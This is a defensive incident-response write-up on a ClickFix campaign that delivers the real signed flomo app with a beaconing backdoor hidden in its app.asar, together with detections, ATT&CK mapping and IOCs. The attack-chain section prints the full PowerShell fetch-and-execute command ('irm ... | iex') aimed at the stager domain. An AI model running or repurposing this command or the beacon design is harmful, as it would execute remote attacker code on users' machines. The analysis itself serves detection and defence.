---
id: flomo-asar-backdoor-reuse
title: "A Signed Note App with a Backdoor in app.asar, Reused Across Campaigns"
summary: "A ClickFix paste delivers the real, vendor-signed flomo Electron app with a beacon grafted into app.asar. The same backdoored build shows up in a public case from months earlier."
category: DFIR
date: 2026-10-08
tags: [clickfix, rat, delivery-chain, windows, malware, electron, flomo]
---

# A Signed Note App with a Backdoor in app.asar, Reused Across Campaigns

*Sanitized: no client-identifying details. IOCs shared for defensive use.*

## TL;DR

- A ClickFix `irm | iex` paste with a fake Windows-Update user agent leads to a ZIP holding the genuine, vendor-signed flomo Electron app
- The malware is a beacon in `resources/app.asar`, which the PE signature doesn't cover, so every executable still verifies
- It polls `finework[.]top/api/` every 30 seconds and can `eval` JavaScript or drop and run an EXE
- The `app.asar` hash matches one in a public write-up from May: same build, different stager and campaign tag

```
CLASS   : ClickFix / trojanized signed app
VECTOR  : ClickFix paste (irm | iex, gated user agent and header)
IMPLANT : Backdoored flomo Electron app (resources/app.asar)
C2      : finework[.]top/api/
IMPACT  : Remote JavaScript and arbitrary EXE execution
```

## Attack Chain

<!-- chain -->

```
(irm 'hxxps://xorados[.]com/h/8285426a1f3d36b5' -UserAgent 'WUA/49df7fcd6f'
 -Headers @{'X-WUA'='49df7fcd6f'})|iex
  → (script not captured) → flomokdh.zip → flomo.exe (signed) loads resources/app.asar
  → injected background.js: POST finework[.]top/api/ every 30 s
  → task: eval(JS)  or  write files to %TEMP%\<ms timestamp>\ and exec the .exe
```

## What happened

I have the original command and the ZIP it led to, but not the script `xorados[.]com` served, so I can't show which step fetches the ZIP. The request carries a user agent and a header that both contain the same token, which reads like a gate that only answers the right client.

`flomo.exe` and its six DLLs all verify against their signatures, and each one shows the app vendor's EV certificate. That is the point of the disguise: AV and allow-lists trust the executable. The malware is in `resources/app.asar`, the Electron main-process bundle, which the PE signature never covered.

In `background.js` a function takes a task and either `eval`s its `e` field or writes its `files` map, base64-decoded, into `%TEMP%\<millisecond timestamp>\` and runs the `.exe` among them. A 30-second loop POSTs `[id, COMPUTERNAME, USERNAME, tag]` to `finework[.]top/api/` with certificate checks off and hands any `task` in the JSON reply to that function. The id is a random 8-character string kept in `%APPDATA%\setup.txt`. The tag comes from a `readme.txt` beside the exe, here `kdh-main`, which matches the ZIP's name. Strings are char-code arrays and the file ends with a `debugger`-timing guard, both standard obfuscator output.

## Same build, different campaign

The `app.asar` SHA-256 `7a534b6f…25469` matches the one in a public write-up from May of a flomo chain delivered from different infrastructure: a `devltd[.]top` ZIP and another stager domain. Same C2, same beacon, same task format. What changes per campaign is the stager, the ZIP name and the `readme.txt` tag, which makes the tag the best pivot between campaigns and the stager token (`49df7fcd6f`) another.

## How I know

- **The executables verify.** I recomputed the Authenticode digest for all seven PE files and each matched its signature. High. That's why a signature check alone passes this ZIP.
- **`app.asar` carries the backdoor.** I listed the asar by hand, extracted `background.js` and read the injected function and its helpers, resolving the char-code strings it uses (`finework.top/api/`, `setup.txt`, `\readme.txt`, `base64`, `.exe`). High.
- **Same file as a public case.** The full SHA-256 matches the published one. High for the file; I can't say it's the same operator.
- **The middle stager is missing.** Open: I never saw what `xorados[.]com` served, and I have no host telemetry, so I can't say what the operator tasked.

## Detection

- PowerShell running `irm ... | iex` with a custom `-UserAgent` is the paste itself.
- An EXE started from `%TEMP%\<13-digit millisecond timestamp>\` is the app's drop-and-run folder.
- `flomo.exe` talking to anything other than flomoapp.com is wrong, and so is any process reaching `finework[.]top`.
- Hash `resources/app.asar` against the vendor's: the exe's signature stays valid when the asar is swapped.

## ATT&CK

| ID | Technique | Where |
|----|-----------|-------|
| T1204.004 | User Execution: Malicious Copy and Paste | The paste |
| T1059.001 | Command and Scripting Interpreter: PowerShell | `irm \| iex` |
| T1059.007 | Command and Scripting Interpreter: JavaScript | `eval` task |
| T1036.005 | Masquerading: Match Legitimate Resource Name or Location | Real signed flomo app |
| T1105 | Ingress Tool Transfer | Dropped `.exe` in `%TEMP%` |
| T1071.001 | Application Layer Protocol: Web Protocols | 30-second HTTPS beacon |
| T1622 | Debugger Evasion | `debugger`-timing guard |

## IOCs

### Network

```
xorados[.]com/h/8285426a1f3d36b5          Stager (User-Agent WUA/49df7fcd6f, header X-WUA: 49df7fcd6f)
finework[.]top/api/                       C2 beacon, POST every 30 s, TLS verification disabled
devltd[.]top, clacndjsvulnarbi[.]beer     Reported by others for the same app.asar; not in my sample
```

### Hashes

```
flomokdh.zip            7a6b3c9b79d6a05b05e2990a4ada3ec3351ab3292e56c008da8d73fd721ff624
app.asar                7a534b6f952b592b65863cc37d134090dcd5dc77e778521494794ab280325469
background.js           ae28576e06121dde815273c90311021645c06c3418b39e8b77997e5847141fed
Origin.txt (command)    05273c3c1d94357a88a1f5e080aea8a9f66157f423ff5c6ba9c3bf3a8218efcd
```

`flomo.exe` (`e32ad3654b38a13decd093db82b75e44e4bcd4b836c816d27488eb1828c33ae5`) and its DLLs are the vendor's own and validly signed, so don't blocklist them. Judge the install by `app.asar`.

### Host

```
%APPDATA%\setup.txt                            8-character victim ID
<app dir>\readme.txt                           campaign tag, here "kdh-main"
%TEMP%\<13-digit ms timestamp>\<name>.exe      drop-and-run folder
```
